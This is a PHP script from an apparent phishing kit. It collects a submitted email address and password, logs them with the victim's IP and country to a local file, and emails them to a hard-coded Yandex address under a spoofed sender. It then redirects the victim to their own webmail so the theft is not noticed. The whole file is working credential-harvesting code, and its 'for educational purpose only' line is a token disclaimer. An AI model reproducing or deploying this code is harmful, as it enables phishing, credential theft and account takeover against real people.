<?php
$country = visitor_country();
$countryCode = visitor_countryCode();
$ip = getenv("REMOTE_ADDR");
$browser = $_SERVER['HTTP_USER_AGENT'];
$login = $_POST['ai'];
$passwd = $_POST['pr'];
$loginID = getloginIDFromlogin($login);
$loginID2 = ucfirst ($loginID);
$login2 = ucfirst ($login);
$own = 'acquisti.stelgroupit@yandex.com';
$domainq = substr(strrchr($login, "@"), 1);
$web = $_SERVER["HTTP_HOST"];
$inj = $_SERVER["REQUEST_URI"];
$file = fopen("error_error","a");
fwrite($file,$country."  -  ".$login."  -  ".$passwd."  -  ".gmdate ("Y-n-d")." @ ".gmdate ("H:i:s")."  -  ".$ip."\n");
$server = date("D/M/d, Y g:i a"); 
$domain3 = 'MadeInChina';
$domain2 = strtoupper ($domain);
$sender = 'info@yourcoolsite.com';
$subj = "$domain3 - $country - $login2";
$headers .= "From: X3D<$sender>\n";
$headers .= "X-Priority: 1\n"; //1 Urgent Message, 3 Normal
$headers .= "Content-Type:text/html; charset=\"iso-8859-1\"\n";
$over = 'http://mail.$loginID';
$msg = "<HTML><BODY>
 <TABLE>
 <tr><td>____Main-Report____</td></tr>
 <tr><td>ID: $login<td/></tr>
 <tr><td>Access: >$passwd<</td></tr>
 <tr><td>IP: $country | $countryCode | <a href='http://whoer.net/check?host=$ip' target='_blank'>$ip</a> </td></tr>
 <tr><td>Login URL: <a href='http://mail.$domainq' target='_blank'>Here</a> or <a href='http://webmail.$domainq' target='_blank'>Here</a></td></tr>
 <tr><td>For educational purpose only</td></tr>
 </BODY>
 </HTML>";
if (empty($login) || empty($passwd)) {
header( "Location: https://www.google.co.uk/?gws_rd=ssl" );
}
else {
mail($own,$subj,$msg,$headers);
header("Location: http://$domainq");
}

function getloginIDFromlogin($login)
{
$find = '@';
$pos = strpos($login, $find);
$loginID = substr($login, 0, $pos);
return $loginID;
}
function getDomainFromEmail($login)
{
// Get the data after the @ sign
$domain = substr(strrchr($login, "@"), 1);
return $domain;
}
$loginID = getloginIDFromlogin($login);
$domain = getDomainFromEmail($login);
$ln = strlen($login);
$len = strrev($login);
$x = 0;
for($i=0; $i<$ln; $i++){
	if($len[$i] == "@"){
		$x = $i;
		break;
	}
}
function visitor_country()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if($ip_data && $ip_data->geoplugin_countryName != null)
    {
        $result = $ip_data->geoplugin_countryName;
    }

    return $result;
}
function visitor_countryCode()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if($ip_data && $ip_data->geoplugin_countryCode != null)
    {
        $result = $ip_data->geoplugin_countryCode;
    }

    return $result;
}
function visitor_regionName()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if($ip_data && $ip_data->geoplugin_regionName != null)
    {
        $result = $ip_data->geoplugin_regionName;
    }

    return $result;
}
function visitor_continentCode()
{
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];
    $result  = "Unknown";
    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }
    else
    {
        $ip = $remote;
    }

    $ip_data = @json_decode(file_get_contents("http://www.geoplugin.net/json.gp?ip=".$ip));

    if($ip_data && $ip_data->geoplugin_continentCode != null)
    {
        $result = $ip_data->geoplugin_continentCode;
    }

    return $result;
}
?>